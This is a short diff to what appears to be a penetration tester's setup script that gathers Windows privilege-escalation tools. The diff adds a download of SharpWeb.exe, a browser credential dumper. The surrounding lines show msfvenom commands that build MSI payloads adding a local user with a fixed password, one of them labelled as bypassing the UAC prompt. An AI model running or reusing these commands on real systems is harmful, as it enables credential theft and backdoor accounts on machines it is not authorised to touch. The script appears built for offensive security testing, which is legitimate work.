@@ -47,6 +47,7 @@
 # - Akagi (UACMe)
 # - AccessChk
 # - ProcDump
+# - SharpWeb.exe
 
 #sudo apt install -y powersploit peass windows-binaries
 
@@ -145,7 +146,7 @@ rm -f Eula.txt
 wget https://download.sysinternals.com/files/Procdump.zip
 unzip Procdump.zip
 rm -f Eula.txt
-
+wget https://github.com/djhohnstein/SharpWeb/releases/download/v1.2/SharpWeb.exe
 
 msfvenom -p windows/adduser USER=nqqb PASS=P@ssword123! -f msi-nouac -o alwe-nouac.msi #No uac format
 msfvenom -p windows/adduser USER=nqqb PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
